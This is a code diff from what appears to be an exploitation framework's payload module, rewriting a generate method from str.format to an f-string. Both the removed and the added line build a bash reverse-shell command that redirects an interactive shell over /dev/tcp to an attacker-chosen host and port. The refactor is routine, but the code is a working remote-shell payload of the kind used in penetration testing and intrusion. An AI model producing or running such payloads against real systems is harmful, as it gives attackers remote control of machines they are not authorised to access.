@@ -14,4 +14,4 @@ class Payload(ReverseTCPPayloadMixin, GenericPayload):
     cmd = OptString("bash", "Bash binary")
 
     def generate(self):
-        return "{} -i >& /dev/tcp/{}/{} 0>&1".format(self.cmd, self.lhost, self.lport)
+        return f"{self.cmd} -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
